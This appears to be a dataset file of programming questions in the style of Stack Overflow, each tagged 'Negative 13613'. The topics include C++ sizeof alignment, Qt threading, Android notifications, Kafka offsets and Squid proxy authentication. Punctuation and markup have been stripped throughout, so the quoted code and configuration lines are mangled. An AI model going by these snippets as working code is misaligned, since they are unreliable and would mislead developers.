Negative 13613 pI routinely download the latest Eclipse IDE for Java EE Developers and add Aptana Studio to it.  I recently did this with Juno 4.2.2 and Aptana Studio 3.4.0.  Now, I find that in the html or css editors, the cmdf key still brings up the findreplace bar once.  But when I ESCape out of that find bar, the cmdf command no longer works until I switch to another editor window and then return to the first one.  Then, cmdf works, but again only one more time.  The EditFindReplace menu item works consistently, so I think it has something to do with key bindings.p  pI also tried downloading the standalone Aptana Studio 3.4.0 and it doesnt have this issue.p  pNever had this problem before.

Negative 13613 pIm trying to troubleshoot a c problem where two parts of my code are returning different results for the sizeof operator. p  pHeres what I runp  precodeMyClass foo  new MyClass int size  sizeoffoo codepre  pI place this code in two different sections of my project and I get two different results. One time it 2254, another is 2284. I can look at the memory layout and one area shows the internal members as bytealigned, another area its word aligned.p  pI look at the dissasmbly and see that the sizeof values are actually part of the machine code. Would this be a bug in the compiler or the linker Why would two parts of the same project view the same class differentlyp  pEDITp  pLet me provide a more clear example that I just ran to show that this is NOT a ODR violation.p  pI just made a brand new class as suchp  precodeclass TestAlignClass  public       TestAlignClass       TestAlignClass    private     char charArray[3]     int myInt  codepre  pIf the class is aligned to 4, it should return sizeof  8 which is what I want. But there are certain classes in my code that return sizeof  7.p  pIn fact when I step into the new operator, sometimes it allocates 7 bytes and sometimes it allocate 8. p  pI am linking several projects together and I thought it had to do with project settings at first, but different parts of the same project will show the discrepancy.p

Negative 13613 pI have a problem with SetsIterators in Java. Im executing code that iterates over elements in a hash set, removing them after they have been used but also removing elements that have been deemed unnecessary to iterate over within the loop. Im also adding elements to the loop. Heres a code samplep  precodeSetltIntegergt thisSet  new HashSetltIntegergt  add elements into set while thisSet.isEmpty     int value  thisSet.iterator.next    thisSet.removevalue     more remove and add operations  codepre  pI chose hash sets because I thought that the remove operations during the loop would be a lot faster than when using a list. The problem is that statistics show me that if the set gets large, polling a value from the set actually takes up a lot of time I assume due to creating an iterator every time. Does anyone have suggestions on how to improve thisp  pThanksp

Negative 13613 pIve got a PhonegapCordova 3.0 app that I am testing on Android.p  pSince version 2.x, Cordova relies heavily on the commandline terminal. Ive done all the setup stuff and I can build the app. But two things are troubling me.p  pFirst of all, an Android project has two www folders. One is [myproject]www. The other is [myproject]platformsandroidassetswww. Im not sure which of these folders to edit when I am fixing bugs.p  pIf I am correct, the first one is where you place your app files before using the commandline cordova build to create the app. The second one should then be only a copy thats used after building, before deploying.p  pNow my question is, when I make a change to my app and I want to test on device, do I have to use the command line to rebuild the app every timep

Negative 13613 pSince some years ago I use matlab for my plots mostly density plots, but now I want to change to matplotlib.

Negative 13613 pa hrefhttpsen.wikipedia.orgwikiMap28higherorderfunction29Generalization relnofollowmapa takes a function and a list and applies the function to every element of the list. e.g.,p  precodemap f [x1 x2 x3]  [f x1 f x2 f x3] codepre  pMathematically, a list is a partial function from the natural numbers . If emxem    emXem is some list, and emfem  emXem  emYem is some function, then map takes the pair emfem, emxem to the list fx    emYem. Therefore, map and comp return the same value, at least in the simple case.p  pHowever, when we apply map with more than one argument, theres something more complex going on. Consider the examplep  precodemap f [x1 x2 x3] [y1 y2 y3]  [f x1 y1 f x2 y2 f x3 y3] codepre  pHere, we have two lists emxem    emXem and emyem    emYem with the same domain, and a function of type emfem  emXem  emYem  emZem. In order to evaluate on the tuple emfem, emxem, emyem, map has to do some more work behind the scenes. p  pFirst, map constructs the diagonal product list diagemxem, emyem    emXem  emYem, which is defined by diagemxem, emyemn  emxemn, emyemn. p  pSecond, map uncurries the function to currysup1supemfem  emXem  emYem  emZem. Finally, map composes these operations to get currysup1supf  diagemxem, emyem    emZem.p  pMy question is does this pattern generalize Namely, suppose that we have three lists emxem    emXem, emyem    emYem and emzem    emZem, and a function emfem  emXem  emYem  emZem  emWem. Does map send the tuple emfem, emxem, emyem, emzem to the list currysup2supf  diagemxem, emyem, emzem    emWemp

Negative 13613 pI want to create a database of users who can then like each other. When a user, for example user 1, likes user 2 then this should be stored. If user 2 subsequently likes user 1 then they should both be informed.  I cant quite work out how I would structure the SQL tables for this. The way I would like to implement this would be to create an array of likes for each user where the users they like are stored. So if user 1 liked user 2,3,4 and 5 this is then stored in user 1s like array. If user 1 is then liked by user 2 then user 1s like array would be checked for user 2.p  pAs far as I know arrays arent available in SQL, so what would be the simplest alternative to thisp

Negative 13613 pIm aware of the fact that QWidgets cannot be moved from the main thread to another thread in Qt. I have a main GUI that has three different QGLWidgets that render different OpenGl content. As expected the framerate of the QGLWidgets suffers significantly when showing all three at the same time but the GUI itself responds very fast and when I look at the CPU usage, I observe that the main thread is only running at 50 CPU load. I would expect better performance if I could move the rendering to different threads but how can I do this as Qt doesnt allow thatp  pPS I use different timers which call the animate method at a desired framerate. Is that a problem The timers dont achieve their configured firing frequency  desired fps, the run at a max. of 15Hz but as I said, the GUI doesnt lag and the main thread doesnt run at full CPU load.p
Negative 13613 pIve been trying to understand the applications of prototyping and I cant see it adding too much utility to JS as a whole.p  pFirst of all, I should probably cover my understanding of prototyping. Attached to constructor is a prototype object, and to that you can add functions. These then apply to all iterations of the class. So lets take the following examplep  precodefunction myCarmyColor, myPrice      var whatAmI  A car A private, static data member     var price  myPrice A private, nonstatic data member     this.color  myColor A public data member     this.utility  driving A public, static data member  codepre  pNow lets say I want to add methods to that. I have a couple ways to do this. One option is I can put it in the constructor function.p  precodefunction myCarmyColor, myPrice      var whatAmI  A car A private, static data member     var price  myPrice A private, nonstatic data member     this.color  myColor A public data member     this.utility  driving A public, static data member      this.honk  function          console.logBeep        var car1  new myCarblue, 1000 car1.honk Works codepre  pAnother option is I can prototype it in.p  precodemyCar.prototype.honk2  function      console.logBeep   car1.honk2 Also works codepre  pBut why would I do this If I maintain the format of keeping all my methods in the constructor function, I can include private methods in a very similar manner which leads to code consistencyp  precodefunction myCarmyColor, myPrice      var whatAmI  A car A private, static data member     var price  myPrice A private, nonstatic data member     this.color  myColor A public data member     this.utility  driving A public, static data member      this.honk  function          console.logBeep          this.honkTwice  function          superSecretTransform          var superSecretTransform  function          console.logNOW I AM A JET I cant access this directly       codepre  pIs there something fundamentally wrong with how I am approaching JavaScript When should I care about the dynamic data member  method declarations allowed by prototypingp

Negative 13613 pI want to do background tasks in Android to send a request to an API, but I cant get it to work the way I want.p  pThese are my scriptsp  pActivity classp  precodepublic class SampleActivity extends Activity       private ApiRequest ar     private String parameters      ...      private void callApi          this.ApiRequest  new ApiRequestthis.parameters       codepre  pApiRequest classp  precodepublic class ApiRequest       private String response      public ApiRequestparameters          new BackgroundTask.executeparameters           protected class BackgroundTask extends AsyncTaskltString, String, Stringgt           Override         protected String doInBackgroundString... args               Do stuff here                   Override         protected void onPostExecuteString response              this.response  response                codepre  pSomehow, I cant seem to update the response string from the onPostExecute method. I know onPostExecute is supposed to update the UI thread, but I want to update the object first, which essentially runs in the UI thread I think. How is this done I cant find anything about it really.p

Negative 13613 pI planned to add an admin panel which use a different layout template for angularjs and expressjs. p  pFor example, the mean stack now defined to use stateProvider as route but it will work globally.p  precode    stateProvider.stateaccess home,          url home,         templateUrl viewsindex.html      codepre  pThat means when I call localhosthome and localhostadminhome would get the same template url.p  pBut what I want is that the route and admin panel route should not have such conflict and render differently for even the same route.p  pI am new to use angularjs and please give a help. Thanks a lotp

Negative 13613 pWhile writing a JSON parser in Java I ran into a cosmetic problemp  pIn the JSON specification its clearly said that Javascript control characters are the same as e.g. in C and Java, like n or t. The problem I was running into, is that when there are control codes within a JSON string so within the quotes propertyvalue, then the displayed JSON code is messed up because the control characters are changing the print, e.g. n creates a new line or t creates a tab.p  pAn examplep  pcodeString s  ntproperty1 The quick brown foxnjumps over the lazy dog,ntproperty2value2ncodep  pPrinting asp  pcode     property1 The quick brown fox jumps over the lazy dog,     property2 value2 codep  pemThe solution would look like thisemp  pcodeString s  ntproperty1 The quick brown foxnjumps over the lazy dog,ntproperty2 value2ncodep  pemPrinting correctly asemp  pcode     property1 The quick brown foxnjumps over the lazy dog,     property2 value2 codep  pSo my question Is it correct to treat control code outside strings differently than the control code within strings And is it correct to add within JSON strings another backslash  before any control characters, creating strings like n or t that wont have any effect on the look of JSON stringsp
Negative 13613 pIm writing tests for a Clojure app using Speclj. Im accustomed in BDD to do things like thisp  precodecontext some context   stub myfunction return true   it has behavior one     should true myfunction   it has behavior two     shouldnot false myfunction codepre  pBut in Speclj I cant seem to find an example of how to share the stub across the characteristics, so Im currently stuck writing code like thisp  precodedescribe this   context that     it accepts nil       withredefs [calledfn constantly nil]           should nil myfn nil     it accepts 1       withredefs [calledfn constantly nil]           should 100 myfn 1 codepre  pI realize this is a somewhat contrived example and arguably those assertions could all go under one characteristic, but lets suppose for now that I have good reason to write the code like this.p  pI want, however, to just have to stub codecalledfncode once, but moving this up out of the codeitcodes raises errors because the real codecalledfncode gets called instead of my redef.p  pIs there a way to reuse redefs or use Speclj stubs in Speclj so Im not stuck pushing them all down inside the characteristicsp

Negative 13613 pI have a need to generate several code.rdlccode reports as PDF files in a Winforms app.  There is no need to display the reports.  The app is using the codeLocalReportcode object to render the reports to PDFs.p  pThis takes a while to do, and I was wondering whether it would be possible to generate each of my reports in a separate thread.  The app has a codeGenerateReportcode method that takes a report name as a parameter and creates a new, local codeLocalReportcode object, so it lends itself to wrapping in a codeSystem.Threading.Taskcode.p  pHowever, this seems not to be threadsafe  it looks as if something deep in the rendering code uses a temp file and all instances of codeLocalReportcode use that same temp file name.  I get IO errors because one instance has deleted the temp file and another is still trying to use it.p  pIs there a threadsafe way to render multiple PDFs from separate .rdlc files, simultaneously  p

Negative 13613 pI have a scenario where an ActiveMQ store enqueues messages if an endpoint is down, and I attempt to redeliver all of the enqueued messages upon receiving new requests. The newest message would therefore be the last one to be processed. If the endpoint is still down, the newest message is also enqueued, and the process will kick off again if it receives a new message. p  pThe problem Im having with this approach is that it would be possible to end up with an unordered queue if the endpoint is still down when I pop a message and reattempt processing, since the message will be reinserted to the BACK of the queue instead e.g. from MSG1, MSG2 to MSG2, MSG1. p  pI considered adding a serverstatus check prior to popping so far, but I was curious to know if there was another way around that, or if I am simply tackling the redelivery method incorrectly.p

Negative 13613 pI cannot figure out how to add multiple barcharts or, even better, piecharts to one plot.p  pThe simplest case would be to add two barcharts at different x,y locations onto a plane.p  pAn application example would be to illustrate both the number of people living in a certain area, and the number of migrants for lack of better example living there as well. By packaging this population information with spatial information, I hope to convey the corresponding information efficiently.p  pSolutions involving ggmaps are fine, however, I do not require them displaying the data without a map layer in the background is acceptable.p  pTo be more precise, here is some code, that is not working as I would like it to. In particular, the barcharts are replaced by rectangles, which are not stacked, but overlap each other, leading to wrongly displayed information.p  pFurthermore, at each location, the total height of each bar in the bar chart or size of the pie, for that matter should correspond to the sum of both parts.p  precoderequireggplot2 x lt c1,2,3 y lt c3,2,4 pop lt c1,7,8 mig lt c1,5,2 df lt rbindx,y,pop,mig df lt tdf df lt data.framedf   bring data in long format requirereshape2 tmp lt meltdf, id.vars  cx,y  p lt ggplottmp, aesxx, yy, fill  variable p lt p  geomrectaesxmin  x, xmax  x  0.1,                        ymin  y, ymax  y  value                       printp codepre  pimg srchttpi.stack.imgur.com4cfB2.jpg altp  pEventually, this should serve as an input into a larger animation, that visualizes temporal development of the variables.p

Until now, I was thinking that calling quit would perhaps cause the thread to simply no longer execute any waiting signals e.g. signals that are queued will no longer have their slots called but still wait on the currently executing slot to finish.p  pBut Im wondering if I was right or if codequitcode actually stops the execution of the thread where its at, for instance if something is unfinished, like a file descriptor hasnt been closed, it definitely should be, even though in most cases my worker objects will clean up those resources, Id feel better if I knew exactly how quit works.p  pIm asking this because codeQThreadquitcode documentation says that its equivalent to calling QThreadexit0.

I can paste the URL into a browser, and I am prompted for a username and password, which then allows me through and I can download the file.p  pTo eliminate our firewall as the cause of the problem, I ran the app on both the internal network and the WiFi which isnt behind the firewall, and it makes no difference. I also connected through FileZilla in Default, Active and Passive modes, and it worked every time. So no problem there.p  pSo then I ran Wireshark.

Negative 13613 pIm using Spring Integration Kafka extension to read and process messages from the Kafka in Java application. As I know it uses highlevel consumer API that doesnt allow fully manage offsets in Zookeeper.p  pIn my case we have strongauto.commit.enablestrongfalse in order to commit offset to Zookeeper after message is processed. If processing fails then offset wont be committed and we should try to process same message again in some configured time starting with offset from Zookeeper.

Please see the documentation at  ltURLhttphttpd.apache.orgdocs2.2vhostsgt  for further details before you try to setup virtual hosts.   You may use the command line option S to verify your virtual host  configuration.    Use namebased virtual hosting.

Negative 13613 pIve seen many questions in regards to this issue but there arent any with an actual answer that works flawlessly. p  pIn my app fitness related I issue a notification when the user leaves it during a workout so that he can quickly return to it. p  precodeIntent intent  new Intentctx, WorkoutActivity.class intent.setFlagsIntent.FLAGACTIVITYCLEARTOP  Intent.FLAGACTIVITYSINGLETOP intent.setClassctx, WorkoutActivity.class return new NotificationCompat.Builderctx             .setOngoingtrue             .setAutoCanceltrue             .setContentIntentPendingIntent.getActivityctx, 0, intent, 0             .setPriorityNotificationCompat.PRIORITYHIGH             .setSmallIconicon codepre  pNow this works just fine. Thanks to the codeIntentcode flags the activity is resumed if its up and running.p  pHowever the problem Im seeing is that whenver the app has been in the background long enough and the OS decides to kill it entering it through the notification will start a new instance of the activity  losing all data. Here are the two ways of reentering the app after it being in the background, including the behaviour Im looking for.p  ol liPress the notification. Problems arise here since the activity has been destroyed and the notification launches a new clean instance of it, without any data saved. strongThis is my problem...strongli liPress the launcher icon. You are then taken to the main activity of the app, and upon closing this you are taken to the destroyed version of the activity and it is restarted, with all state restored. strongThis is how I want it to work through the notification as well.strongli ol  pAdditionally I am saving all state in codeonSaveInstanceStatecode and restoring it as per android standard with the codesavedInstanceStatecode variable in codeonCreatecode. p  pHeres the relevant part of the manifestp  precode  ltactivity         androidnameworkout.progression.ui.workout.WorkoutActivity         androidparentActivityNameworkout.progression.ui.MainActivity         androidthemestyleAppTheme.WorkoutActivity         androidwindowSoftInputModeadjustResizestateAlwaysHiddengt codepre  pAnd heres the root activityp  precode   ltactivity     androidnameworkout.progression.ui.MainActivity     androidlabelstringappname     androidwindowSoftInputModestateAlwaysHiddenadjustPangt      ltintentfiltergt         ltaction androidnameandroid.intent.action.MAINgt          ltcategory androidnameandroid.intent.category.LAUNCHERgt         ltintentfiltergt     ltactivitygt codepre
Negative 13613 pI know c, like Java, translating the source into bytecode and run by VM, for C case is CIL stored in assembly and executed by CLR. Developers scarcely need to care about where the variable is on stack or on heaphandled by GC as c, right   p  pIs their any quick and straightforward way to demonstrate that a variable is stored on stack or on heap For example, if I tell someone the reference type variables are stored on heap or the local value type variable on stackright. How can I show that explicitly In C, I can get a variables memory address and view its value stored in stack or heap memory by VS memory window.p
Negative 13613 pGood day everyone. This is my first question on stackoverflow. I googled and binged this thing to death but not one single hit. I am trying to compile a c lib with g on Mint 17. I am getting a frustrating unclear failure message. I would like to know if anyone has encountered this before. I realise it looks like a missing include, the strange thing is the location pointed out as the point of failure and the lack of information. Usually the compiler specifies which file it cannot locate. Please see the message below. Any suggestions will be greatly appreciated.p  precodeusrbinmake f nbprojectMakefileDebug.mk QMAKE SUBPROJECTS .buildconf make[1] Entering directory homebfvanrooyenProjectsManagement ConsoleEvent Monitor cd ..Perlingo Library ampamp usrbinmake  f Makefile CONFDebug make[2] Entering directory homebfvanrooyenProjectsManagement ConsolePerlingo Library usrbinmake f nbprojectMakefileDebug.mk QMAKE SUBPROJECTS .buildconf make[3] Entering directory homebfvanrooyenProjectsManagement ConsolePerlingo Library usrbinmake  f nbprojectMakefileDebug.mk distDebugGNULinuxx86libbhamdev.so make[4] Entering directory homebfvanrooyenProjectsManagement ConsolePerlingo Library mkdir p buildDebugGNULinuxx86src rm f buildDebugGNULinuxx86srcBhamEvent.o.d g m32   c g Wall Iinclude Isrc I..Perlingo Shared Objects include include fPIC  MMD MP MF buildDebugGNULinuxx86srcBhamEvent.o.d o buildDebugGNULinuxx86srcBhamEvent.o srcBhamEvent.cpp In file included from ltcommandlinegt00 usrincludestdcpredef.h591 fatal error include No such file or directory  endif   compilation terminated. codepre

Negative 13613 pHi Im trying to transfer one object from one combobox to another and vice versa. To accomplish this, I use actionListeners or ItemListeners, to no luck that they dont answer my problems, or maybe theres just something wrong in my implementation.p  pAssuming we have to comboboxes, combobox1 and combobox2. Basically,  1. I first add the selected item to another combobox combobox2 2. I remove the selected item on the first combobox combobox1p  pWhen trying to debug this, i found out that everytime i am on the step of removing items, the listener of the other combobox fires, which does the same steps as above. This results into a loop, that just deletes the item, and places it back to the original combobox.p  pWhen using the ItemListener, with the proper if conditions of being selected or not, it throws a bigger error.

Negative 13613 pHow can I log onto Microsoft Live with .NET WebClient and automate the OAuth process to get a token to make Bing Ads API calls p  pMy question is similar to a hrefhttpstackoverflow.comquestions15050113howdoigetanoauthrequesttokenfromlivecomHow do I get an OAuth requesttoken from live.coma. However, I am building C, .NET 4.5.2 a headless Windows Service using the context of a Bing Ads super admin account that is linked to multiple other Bing Ads accounts. The idea is to authenticate, get the auth bits, and then make calls using the bits at 300am. Some of the accounts compete so for example group A should not see data from group B, so having an application get data for everyone and filter it and distribute it overnight solves many business  problems.p  pI am concerned that if Live experiences problems, or our application is down for an extended time for any reason, we will have to reauthenticate manually to get data again. Maintenance and management of the credentials is now additional overhead this is for an enterprise environment that will have to take the form of an intranet web sitepage to allow junioruninitiated folks to do the work if needed lets not forget testing and documentation. To contrast, Google provides an option to use key pairs for groups that need to work in a fully automated manner. It appears that Twitters OAuth2 implementation can be automated without a GUI logon. It appears that other Bing services eg a hrefhttpweblog.westwind.composts2013Jun06SettingupandusingBingTranslateAPIServiceforMachineTranslation relnofollowTranslationa can also be automated with WebClient.p  pI have the Microsoft account name and password already, and have a callback URL of localmydomain.com set in the Bing Ads app GUI and have a HOSTS entry for localmydomain.com.p  pThe Microsoft a hrefhttpmsdn.microsoft.comenuslibrarydn466514.aspx relnofollowsamplea appears to work, but it automates the MS Web Browser Control, expects a user to input credentials in the GUI, and then the token is given. Giving the super admin account to users to do this is not an option. Expecting a user to get up at 300am to authenticate to uploaddownload data is not an option. Expecting a user to get desktop access to a server in the farm to run something is not an option.p  pAll OAuth ideas appreciated.p  pThanks.p  pHere is the launching codep  precode partial class OAuthForm  Form              private static OAuthForm form         private static WebBrowser browser          private static string code         private static string error           When you register your application, the Client ID is provisioned.          private const string ClientId  000redacted000           Requestrelated URIs that you use to get an authorization code,           access token, and refresh token.          private const string AuthorizeUri  httpslogin.live.comoauth20authorize.srf          private const string TokenUri  httpslogin.live.comoauth20token.srf          private const string DesktopUri  httpslogin.live.comoauth20desktop.srf          private const string RedirectPath  oauth20desktop.srf         private const string ConsentUriFormatter  0clientid1ampscopebingads.manageampresponsetypecodeampredirecturi2         private const string AccessUriFormatter  0clientid1ampcode2ampgranttypeauthorizationcodeampredirecturi3         private const string RefreshUriFormatter  0clientid1ampgranttyperefreshtokenampredirecturi2amprefreshtoken3           Constructor          public OAuthFormstring uri                      InitializeFormuri                   [STAThread]         static void Main                       Create the URI to get user consent.

Negative 13613 pIm reading about regular expression in Java. And I understand that possessive quantifiers do not backtrack and release characters to give a chance for other group to achieve a match. But I couldnt figure any situations where possessive quantifiers are used in reality. I have read some resources saying that since possessive quantifiers dont backtrack, they dont need to remember the position of each character in the input string, which helps to significantly improve performance of the regular expression engine. I have tested this by writing an examplep  pI have a string containing about thousands of digits.p  pFirst I defined a greedy codeString regex  dcodep  pThen I counted the time it took.p  pSecond I change to possessive codeString regex  dcodep  pAlso I counted the time it took but I dont see any difference in timep  pAm I misunderstanding somethingp  pAnd besides, can anyone give me some specific cases where possessive quantifiers are in usep  pAnd about the term In the book codeJava Regular Expressions Taming the Java.Util.Regex Engine by Mehran Habibicode he used the term codepossessive qualifierscode, while I read in the Internet, people used codePossessive quantifiercode.

Negative 13613 pI am busy trying to code a ping pong type game into my FPGA Board Altera Cyclone II model and there are two clocks, 50MHz and 27MHz. A clock is required for the game to work. I want to use the 50MHz clock but need to slow it down to 1Hz the ball should only move one LED for every oscillation. I am a very new user to VHDL and FPGA and have done some research online but none have really helped me regarding the slowing down of the clock in VHDL.p  pMy thinking is to use two loops, one for low and one for high and using 25000000 clock cycles for high and 25000000 clock cycles for low which will end up generating a 1Hz clock when using the 50MHz clock. I have no idea how to go about implementing it in VHDL though even though I know the noncode logic for it. p  pI checked a previous similar question a hrefhttpsstackoverflow.comquestions23504998clockdividersimulationClock divider simulationa but the person who posted the question did not include comments and I cant really follow what goes on in that code.

Negative 13613 pI am trying to create a monitoring application for our operations department to be proactive when dealing with systems that are encountering problems. I created an app that does the job but it has some draw backsp  ol liEach copy of the app running serves individual pings to the systems, when 1 ping would suffice.li liI have 3 different apis for getting the status of our systems depending whether its hosted IIS, WCF or desktop.li ol  pTo fix the first issue i was going to create a database which an interim serviceappmonitor would make the pings, then the app would query the database for updates. After thinking about this I realized the second issue and decided it is a future problem. p  pSo my thought was to, rather than have the interim application pinging the systems, simply have each system have one interface in which it posts it status to the database every x time. But then I ran into a problem with the WCF and IIS services we have. These services can sit for days without anyone actually using the service. How would I make these services continue to post its datap  pMy questions are p  pIs it better to have data REQUESTED or PUSHED in this type of situationp  pIf REQUESTED, what is a suggested practice for maintaining a single API across mulitple platformsIIS, WCF, Desktopp  pIf PUSHED, how would you handle the case of the Web services which are instance based and not continuously runningp

Negative 13613 pI am developing a webapp running on Tomcat7, and using maven for dependenciesautomated builds. Yesterday I started using the a hrefhttpsgithub.comJasigsassmavenplugin relnofollowsassmavenplugina, which is great. Its goal codesassupdatestylesheetscode processes sass files and outputs css. Unfortunately, I cant have it executed during the webapp packaging. I am pretty new to maven too, so I might have missed something. Heres my understanding p  ul liwhen I type codemvn tomcat7deploycode, maven executes the codedeploycode goal defined in the tomcat7 pluginli lithis plugin goes through some phases of the development lifecycle. More specifically, as mentioned in the a hrefhttptomcat.apache.orgmavenplugin2.2tomcat7mavenplugindeploymojo.html relnofollowdoca, it invokes the execution of the lifecycle phase package prior to executing itself.li liif I map the goal sassupdatestylesheets to the package phase in codeltbuildgtltexecutionsgtltbuildgtcode, it should be executed everytime I deployredeploy my app.li ul  pWhen I run codemvn sassupdatestylesheetscode independently of tomcat7deploy, everything is smooth. sassmavenplugin gets the .scss files from srcmainresources, processes them and places the output in srcmainwebappresources, where I want it to be to be deployed with my webapp. Unfortunately, if I dont run the command prior to codetomcat7deploycode, I dont get any css for my pages.

Negative 13613 pI updated my Nexus 5 to Lollipop and now my Android App got this bugp  pMy App get its content from my websites api.

For beeing able to cancel the update process, I only start the next codehttppostcode when the previous is completed.p  pOn lower Android versions there is no problem, but with Lollipop when I start the update the first 4 Items are loaded normally and fast 50ms but the fifth stucks during coderesponse  httpClient.executehttppostcode in the following Codep  precode    HttpPost httppost     try          httppost  new HttpPosturl      catch IllegalArgumentException e          Log.eGlobals.TAGAPI, Wrong URL         throw e          HttpResponse response     HttpParams httpParams  new BasicHttpParams     httpParams.setParameterCoreProtocolPNames.PROTOCOLVERSION, HttpVersion.HTTP11     HttpConnectionParams.setTcpNoDelayhttpParams, false     HttpConnectionParams.setConnectionTimeouthttpParams, 30000     HttpConnectionParams.setSoTimeouthttpParams, 30000      HttpClient httpClient  new DefaultHttpClienthttpParams     HttpEntity entity     try          Log.dGlobals.TAG,Start         httppost.setEntitynew UrlEncodedFormEntitynameValuePairs, utf8         response  httpClient.executehttppost         Log.dGlobals.TAG,Stop         entity  response.getEntity      codepre  pAfter 30 seconds the Timeout cancels the Connection. strongAlso importantstrong during this 30 seconds the whole Homepage is not reachable anymore.

Negative 13613 pI have four ListBox items on my C form. What I want is for only one item to be selected at any one time. That is to say, one item on any of the four ListBox controls.p  pI know that you can change the SelectedIndex to 1 which deselects the currently selected item, and thats great. The problem is the event firing.p  pSo my four ListBox controls are A, B, C and D. I have a SelectedIndexChanged event on A which sets the SelectedIndex of B, C and D to 1. I also have such an event on B which sets the SelectedIndex of A, C and D to 1, and so on for all four.p  pI select an item on A, which calls the SelectedIndex for B, C and D to become 1. But then that calls their SelectedIndexChanged event, which sets all the others including A to 1 too. If I could stop them calling that event for this short time, that would be great.p  pI hope someone can offer some assistance. Thanks.p

Negative 13613 pWhat is a more likely cause for our apps inability to decrypt a key in a prefs file a failed decryption, or an unavailable KeyStore p  pFor our previous version of our application, we store a key and salt for encryption in the user preferences file. This is insecure and so, for our newest version of our application, we changed our code to get the key from the KeyStore using the 4.3 SDK. p  pNow, sometimes, when users upgrade their app, the application cannot get the key from the KeyStore. We use the key to decrypt data for multiple bits of information and for one of those bits, the key is not retrieved. p  pWe do not know if it is because there was a failure in decryption or if the KeyStore became unavailable. We have not been able to reproduce this inhouse. p  pThere are reports from users that a reboot resolved this issue. There is also a report that once the apps data is removed and readded using the new version, everything works fine. p  pThis has only been reported to us when the application is updated from the Google Play Store. That seems to be the key  . Once the data is in and our application uses the KeyStore key for all the bits, everything seems to work fine. p  pSo, what I need to know is. Are there any known problems in this scenario Are there any tips on how we can reproduce this inhousep

Negative 13613 pMy android app allows the user to select an item and set an alarm on it. Im trying to implement this with a repeating alarm, but I dont want the alarm to repeat forever. I want it to automatically be cancelled after 2 repeats. For example, the user selects an item and sets the alarm to 30 minutes. Thirty minutes later the alarm goes off notification is delivered, but the user hasnt taken any action other than silence the alarm. Five minutes later the alarm is repeated if the user hasnt taken any action on the selected item. Another five minutes later the alarm is repeated if the user still hasnt taken any action.p  pIf it gets to the second reminder, regardless of whether the user takes action or not, Id like to cancel the alarm.p  pIm pretty sure I can manage this outside of alarm receiver class, but is there a way within the class to determine how many times the alarm for a specific item has been called  My alarm receiver class extends Service.p  pThanks, Marp

Negative 13613 pI am working on implementing CANbus communication between the ARS308 radar from continental and the beaglebone black. Additionally to this two devices I have connected the MCP2551 to translate the CAN signals to RxTx.

See pictures below.p  pa hrefhttpimageshack.comaimg9103126VufRWU.jpg relnofollowhttpimageshack.comaimg9103126VufRWU.jpgap  pa hrefhttpimageshack.comaimg9032530eusAhX.jpg relnofollowhttpimageshack.comaimg9032530eusAhX.jpgap  pOnce the communication is started, testing the candump commands show that they dont work. Since, when creating a virtual CAN port these tools candumpcansend work, my guess is that is a problem of voltage levels. It can be seen that when the CAN communication is started, the low voltage level is above 2V, and the beaglebone cannot differentiate the levels and it doesnt read anything...

Negative 13613 pI have a VehiclePrice field in my Model that I am using different labels on. I have 3 different divs, only one of which will display based on a dropdown selection of Car, Truck, or SUV. The labels are Sedan Price, Truck Price, and SUV Price. Im new to MVC and as a database guy, I dont like the idea of creating 3 different fields to hold the same thing  Price. I need the Validation message to refer to the specific label when it spits out a Required or a Range message, i.e., strongCarstrong Price is required, strongTruckstrong Price must be between 10000 and 900000, etc, instead of just Price is required. Why Because there are other Price labels in the same div.  My instructions were that I needed to use the Html validation stuff, which seems rather difficult to modify. Is there a simple way to override the message or at least to prepend or append Car, Truck, or SUV to it Or maybe a way to override some of the dataval attributes.p

Negative 13613 pI was hoping for some design advice on the use ServiceBus relays and if the they are the most appropriate technology for my use case.p  pSummary of setup p  ol liThere are 1000s of clientsli liAll clients are behind a NAT and not directly accessible by the serverli liThere is 1 server that is used to configure one client at a timeli liThe server will run a user interface to access the clients using WCF TCPli liThis user interface is only required occasionally to configure the client.li liThe server should be able to initiate a session to configure a single client on demand.li liBoth server and client is written in .netli liWhen the server connects to a client  it would keep the session open until all configuration is completed  it also uses a duplex channel to enable 2way communication.li ol  pTo achieve this I was proposing that each client would make a connection to ServiceBus relay using netTCPRelayBinding.  There would be a unique relay for each client therefore 1000s of relays.  This relay would remain active permanently waiting for the server to connect to the relay when we want to configure.  We would complete configuration using a duplex channel and then disconnect.  The relay would remain open on the client waiting for the next time that we want to connect to configure the service.  It could be months between connections to configure the client.p  pQuestionsp  ol liIs this the best design solutionli liWill the relay stay open for very long periods of time days, monthsli liOn the client I have subscribed to the serviceHost Faulted event.  Is this enough to capture disconnects from the relay and allow me to then recreate the relay if it failedli liIs it possible that the client would create the relay  but something goes wrong and it does not fault  but therefore the server can never contact that clientli liShould ReliableSession be usedli liIs a duplex session problematicli liIs there a significant performance issues in having 1000s of clients create relays that are only used very occasionallyli liWould there be a cost impact for creating 1000s of relay connections that are only occasionally usedli ol  pIf this is not the best solution to keep these clients contactable, what would be your suggestionp  pThanks and I look forward to your advice.p

Negative 13613 pI have a fairly basic setup with ncsaauth and sslbump on squid 3.1.12.  Its working in general, however when I attempt to connect to an https site, I first get an HTTP 407 as expected which prompts a browser to ask for credentials. After the sslbump, cert warnings, etc, I then get an HTTP 401, which again causes a prompt for credentials. So you need to give your credentials twice when using a browser.  Im ultimately trying to get this setup to be friendly to nonbrowser based connections e.g. Apache HttpClient and struggling to handle this there as well.p  pIs there anything that can be done in the squid config to avoid the second auth challenge p  pHere are the pertinent lines from squid.confp  precodeauthparam basic program usrsbinncsaauth etcsquidpasswd acl proxyusers proxyauth REQUIRED httpaccess allow proxyusers httpaccess deny all httpport 3128 sslbump certetcsquidsquid.cert keyetcsquidsquid.key alwaysdirect allow all sslbump allow all sslproxycerterror deny all codepre

